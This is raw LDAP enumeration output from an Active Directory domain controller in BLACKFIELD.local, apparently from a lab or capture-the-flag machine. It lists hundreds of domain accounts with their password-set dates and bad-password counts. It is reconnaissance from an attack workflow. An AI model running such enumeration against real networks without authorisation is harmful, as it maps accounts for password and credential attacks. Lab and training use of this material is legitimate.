LDAP        10.129.229.17   389    DC01             [*] Enumerated 315 domain users: BLACKFIELD.local
LDAP        10.129.229.17   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                        
LDAP        10.129.229.17   389    DC01             Administrator                 2020-02-24 02:09:53 0        Built-in account for administering the computer/domain                                                                                                                                   
LDAP        10.129.229.17   389    DC01             Guest                         2020-06-04 00:18:28 0        Built-in account for guest access to the computer/domain                                                                                                                                 
LDAP        10.129.229.17   389    DC01             krbtgt                        2020-02-24 02:08:31 0        Key Distribution Center Service Account                                                                                                                                                  
LDAP        10.129.229.17   389    DC01             audit2020                     2020-09-22 06:35:06 3                                             
LDAP        10.129.229.17   389    DC01             support                       2020-02-24 01:53:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD764430              2020-02-23 20:43:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD538365              2020-02-23 20:43:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD189208              2020-02-23 20:43:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD404458              2020-02-23 20:43:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD706381              2020-02-23 20:43:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD937395              2020-02-23 20:43:25 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD553715              2020-02-23 20:43:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD840481              2020-02-23 20:43:28 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD622501              2020-02-23 20:43:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD787464              2020-02-23 20:43:31 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD163183              2020-02-23 20:43:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD869335              2020-02-23 20:43:35 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD319016              2020-02-23 20:43:36 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD600999              2020-02-23 20:43:38 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD894905              2020-02-23 20:43:39 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD253541              2020-02-23 20:43:41 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD175204              2020-02-23 20:43:42 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD727512              2020-02-23 20:43:44 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD227380              2020-02-23 20:43:45 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD251003              2020-02-23 20:43:47 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD129328              2020-02-23 20:43:49 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD616527              2020-02-23 20:43:50 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD533551              2020-02-23 20:43:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD883784              2020-02-23 20:43:53 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD908329              2020-02-23 20:43:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD601590              2020-02-23 20:43:56 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD573498              2020-02-23 20:43:58 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD290325              2020-02-23 20:43:59 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD775986              2020-02-23 20:44:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD348433              2020-02-23 20:44:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD196444              2020-02-23 20:44:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD137694              2020-02-23 20:44:05 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD533886              2020-02-23 20:44:06 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD268320              2020-02-23 20:44:07 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD909590              2020-02-23 20:44:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD136813              2020-02-23 20:44:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD358090              2020-02-23 20:44:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD561870              2020-02-23 20:44:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD269538              2020-02-23 20:44:14 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD169035              2020-02-23 20:44:16 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD118321              2020-02-23 20:44:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD592556              2020-02-23 20:44:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD618519              2020-02-23 20:44:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD329802              2020-02-23 20:44:22 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD753480              2020-02-23 20:44:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD837541              2020-02-23 20:44:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD186980              2020-02-23 20:44:26 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD419600              2020-02-23 20:44:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD220786              2020-02-23 20:44:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD767820              2020-02-23 20:44:31 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD549571              2020-02-23 20:44:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD411740              2020-02-23 20:44:40 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD768095              2020-02-23 20:44:57 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD835725              2020-02-23 20:44:58 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD251977              2020-02-23 20:44:59 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD430864              2020-02-23 20:45:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD413242              2020-02-23 20:45:01 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD464763              2020-02-23 20:45:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD266096              2020-02-23 20:45:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD334058              2020-02-23 20:45:04 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD404213              2020-02-23 20:45:06 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD219324              2020-02-23 20:45:07 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD412798              2020-02-23 20:45:08 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD441593              2020-02-23 20:45:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD606328              2020-02-23 20:45:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD796301              2020-02-23 20:45:11 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD415829              2020-02-23 20:45:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD820995              2020-02-23 20:45:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD695166              2020-02-23 20:45:14 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD759042              2020-02-23 20:45:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD607290              2020-02-23 20:45:16 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD229506              2020-02-23 20:45:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD256791              2020-02-23 20:45:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD997545              2020-02-23 20:45:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD114762              2020-02-23 20:45:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD321206              2020-02-23 20:45:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD195757              2020-02-23 20:45:22 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD877328              2020-02-23 20:45:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD446463              2020-02-23 20:45:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD579980              2020-02-23 20:45:25 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD775126              2020-02-23 20:45:26 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD429587              2020-02-23 20:45:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD534956              2020-02-23 20:45:28 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD315276              2020-02-23 20:45:29 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD995218              2020-02-23 20:45:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD843883              2020-02-23 20:45:31 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD876916              2020-02-23 20:45:32 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD382769              2020-02-23 20:45:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD194732              2020-02-23 20:45:34 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD191416              2020-02-23 20:45:35 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD932709              2020-02-23 20:45:36 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD546640              2020-02-23 20:45:37 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD569313              2020-02-23 20:45:38 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD744790              2020-02-23 20:45:39 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD739659              2020-02-23 20:45:40 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD926559              2020-02-23 20:45:41 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD969352              2020-02-23 20:45:42 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD253047              2020-02-23 20:45:43 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD899433              2020-02-23 20:45:44 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD606964              2020-02-23 20:45:45 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD385719              2020-02-23 20:45:46 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD838710              2020-02-23 20:45:47 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD608914              2020-02-23 20:45:48 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD569653              2020-02-23 20:45:50 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD759079              2020-02-23 20:45:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD488531              2020-02-23 20:45:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD160610              2020-02-23 20:45:52 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD586934              2020-02-23 20:45:53 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD819822              2020-02-23 20:45:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD739765              2020-02-23 20:45:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD875008              2020-02-23 20:45:56 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD441759              2020-02-23 20:45:57 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD763893              2020-02-23 20:45:59 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD713470              2020-02-23 20:46:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD131771              2020-02-23 20:46:01 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD793029              2020-02-23 20:46:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD694429              2020-02-23 20:46:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD802251              2020-02-23 20:46:04 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD602567              2020-02-23 20:46:05 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD328983              2020-02-23 20:46:06 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD990638              2020-02-23 20:46:07 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD350809              2020-02-23 20:46:08 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD405242              2020-02-23 20:46:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD267457              2020-02-23 20:46:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD686428              2020-02-23 20:46:11 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD478828              2020-02-23 20:46:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD129387              2020-02-23 20:46:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD544934              2020-02-23 20:46:14 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD115148              2020-02-23 20:46:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD753537              2020-02-23 20:46:16 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD416532              2020-02-23 20:46:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD680939              2020-02-23 20:46:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD732035              2020-02-23 20:46:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD522135              2020-02-23 20:46:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD773423              2020-02-23 20:46:22 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD371669              2020-02-23 20:46:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD252379              2020-02-23 20:46:25 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD828826              2020-02-23 20:46:26 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD548394              2020-02-23 20:46:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD611993              2020-02-23 20:46:28 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD192642              2020-02-23 20:46:29 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD106360              2020-02-23 20:46:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD939243              2020-02-23 20:46:32 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD230515              2020-02-23 20:46:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD774376              2020-02-23 20:46:34 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD576233              2020-02-23 20:46:35 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD676303              2020-02-23 20:46:36 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD673073              2020-02-23 20:46:37 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD558867              2020-02-23 20:46:38 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD184482              2020-02-23 20:46:39 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD724669              2020-02-23 20:46:40 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD765350              2020-02-23 20:46:41 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD411132              2020-02-23 20:46:43 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD128775              2020-02-23 20:46:44 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD704154              2020-02-23 20:46:45 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD107197              2020-02-23 20:46:46 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD994577              2020-02-23 20:46:47 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD683323              2020-02-23 20:46:48 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD433476              2020-02-23 20:46:49 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD644281              2020-02-23 20:46:50 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD195953              2020-02-23 20:46:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD868068              2020-02-23 20:46:52 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD690642              2020-02-23 20:46:53 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD465267              2020-02-23 20:46:54 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD199889              2020-02-23 20:46:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD468839              2020-02-23 20:46:56 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD348835              2020-02-23 20:46:57 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD624385              2020-02-23 20:46:58 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD818863              2020-02-23 20:46:59 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD939200              2020-02-23 20:47:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD135990              2020-02-23 20:47:01 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD484290              2020-02-23 20:47:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD898237              2020-02-23 20:47:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD773118              2020-02-23 20:47:04 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD148067              2020-02-23 20:47:05 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD390179              2020-02-23 20:47:06 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD359278              2020-02-23 20:47:08 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD375924              2020-02-23 20:47:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD533060              2020-02-23 20:47:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD534196              2020-02-23 20:47:11 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD639103              2020-02-23 20:47:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD933887              2020-02-23 20:47:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD907614              2020-02-23 20:47:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD991588              2020-02-23 20:47:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD781404              2020-02-23 20:47:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD787995              2020-02-23 20:47:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD911926              2020-02-23 20:47:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD146200              2020-02-23 20:47:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD826622              2020-02-23 20:47:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD171624              2020-02-23 20:47:22 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD497216              2020-02-23 20:47:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD839613              2020-02-23 20:47:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD428532              2020-02-23 20:47:26 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD697473              2020-02-23 20:47:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD291678              2020-02-23 20:47:28 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD623122              2020-02-23 20:47:29 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD765982              2020-02-23 20:47:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD701303              2020-02-23 20:47:31 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD250576              2020-02-23 20:47:32 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD971417              2020-02-23 20:47:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD160820              2020-02-23 20:47:34 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD385928              2020-02-23 20:47:35 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD848660              2020-02-23 20:47:36 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD682842              2020-02-23 20:47:37 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD813266              2020-02-23 20:47:38 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD274577              2020-02-23 20:47:39 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD448641              2020-02-23 20:47:40 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD318077              2020-02-23 20:47:41 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD289513              2020-02-23 20:47:42 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD336573              2020-02-23 20:47:43 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD962495              2020-02-23 20:47:44 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD566117              2020-02-23 20:47:45 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD617630              2020-02-23 20:47:47 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD717683              2020-02-23 20:47:48 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD390192              2020-02-23 20:47:49 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD652779              2020-02-23 20:47:50 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD665997              2020-02-23 20:47:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD998321              2020-02-23 20:47:52 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD946509              2020-02-23 20:47:53 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD228442              2020-02-23 20:47:54 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD548464              2020-02-23 20:47:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD586592              2020-02-23 20:47:56 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD512331              2020-02-23 20:47:57 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD609423              2020-02-23 20:47:58 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD395725              2020-02-23 20:47:59 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD438923              2020-02-23 20:48:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD691480              2020-02-23 20:48:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD236467              2020-02-23 20:48:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD895235              2020-02-23 20:48:04 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD788523              2020-02-23 20:48:05 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD710285              2020-02-23 20:48:07 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD357023              2020-02-23 20:48:08 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD362337              2020-02-23 20:48:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD651599              2020-02-23 20:48:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD579344              2020-02-23 20:48:11 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD859776              2020-02-23 20:48:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD789969              2020-02-23 20:48:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD356727              2020-02-23 20:48:14 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD962999              2020-02-23 20:48:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD201655              2020-02-23 20:48:16 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD635996              2020-02-23 20:48:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD478410              2020-02-23 20:48:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD518316              2020-02-23 20:48:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD202900              2020-02-23 20:48:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD767498              2020-02-23 20:48:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD103974              2020-02-23 20:48:22 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD135403              2020-02-23 20:48:23 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD112766              2020-02-23 20:48:24 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD978938              2020-02-23 20:48:25 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD871753              2020-02-23 20:48:26 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD136203              2020-02-23 20:48:27 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD634593              2020-02-23 20:48:28 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD274367              2020-02-23 20:48:29 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD520852              2020-02-23 20:48:30 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD339143              2020-02-23 20:48:31 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD684814              2020-02-23 20:48:32 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD792484              2020-02-23 20:48:33 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD802875              2020-02-23 20:48:34 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD383108              2020-02-23 20:48:35 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD318250              2020-02-23 20:48:36 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD496547              2020-02-23 20:48:37 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD219914              2020-02-23 20:48:38 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD454313              2020-02-23 20:48:39 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD460131              2020-02-23 20:48:41 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD613771              2020-02-23 20:48:42 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD632329              2020-02-23 20:48:43 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD402639              2020-02-23 20:48:44 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD235930              2020-02-23 20:48:45 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD246388              2020-02-23 20:48:46 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD946435              2020-02-23 20:48:47 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD739227              2020-02-23 20:48:48 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD827906              2020-02-23 20:48:49 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD198927              2020-02-23 20:48:50 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD169876              2020-02-23 20:48:51 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD150357              2020-02-23 20:48:52 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD594619              2020-02-23 20:48:53 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD274109              2020-02-23 20:48:54 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD682949              2020-02-23 20:48:55 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD316850              2020-02-23 20:48:56 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD884808              2020-02-23 20:48:57 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD327610              2020-02-23 20:48:58 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD899238              2020-02-23 20:49:00 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD184493              2020-02-23 20:49:01 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD631162              2020-02-23 20:49:02 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD591846              2020-02-23 20:49:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD896715              2020-02-23 20:49:03 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD500073              2020-02-23 20:49:05 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD584113              2020-02-23 20:49:06 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD204805              2020-02-23 20:49:07 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD842593              2020-02-23 20:49:08 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD397679              2020-02-23 20:49:09 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD842438              2020-02-23 20:49:10 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD286615              2020-02-23 20:49:11 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD224839              2020-02-23 20:49:12 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD631599              2020-02-23 20:49:13 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD247450              2020-02-23 20:49:14 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD290582              2020-02-23 20:49:15 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD657263              2020-02-23 20:49:16 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD314351              2020-02-23 20:49:17 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD434395              2020-02-23 20:49:18 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD410243              2020-02-23 20:49:19 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD307633              2020-02-23 20:49:20 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD758945              2020-02-23 20:49:21 0                                             
LDAP        10.129.229.17   389    DC01             BLACKFIELD541148              2020-02-23 20:49:22 0                                             
